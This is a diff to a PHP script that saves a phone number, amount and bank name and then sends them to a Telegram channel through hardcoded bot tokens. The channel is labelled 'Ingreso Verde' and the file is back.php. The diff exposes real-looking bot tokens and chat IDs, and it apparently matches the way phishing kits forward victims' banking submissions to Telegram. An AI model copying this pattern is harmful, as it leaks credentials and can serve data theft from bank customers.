@@ -45,12 +45,14 @@ $stmt = $pdo->prepare(
 $stmt->execute([$celular, $monto, $banco, $request_id, $key]);
 
 // ── Paso 4: Telegram (mismo canal OPERACIONES unificado en esta instalación) ──
-// 1) Render env vars TELEGRAM_BOT_TOKEN_OPS / TELEGRAM_CHAT_ID_OPS si existen (nuevo canal).
-// 2) Fallback LEGACY => canal propio anterior "Ingreso Verde" (token 7617... / chat -4801629674).
-$FALLBACK_BOT_TOKEN_LEGACY = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
-$FALLBACK_CHAT_ID_LEGACY   = "-4801629674";
-$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_LEGACY;
-$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_LEGACY;
+// FIX DETERMINANTE: CANAL NUEVO hardcodeado DEFAULT. getenv() SOLO sobreescribe si
+// existe y no está vacía. Nunca más al canal legacy anterior.
+$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
+$DEFAULT_CHAT_ID_OPS   = "-5503364698";
+$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
+$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
+$token   = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
+$chat_id = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;
 
 $mensaje  = "🌱 <b>[INGRESO VERDE]</b> Entrada directa back.php (sin landing anterior):\n";
 $mensaje .= "🏦 Banco: $banco\n";
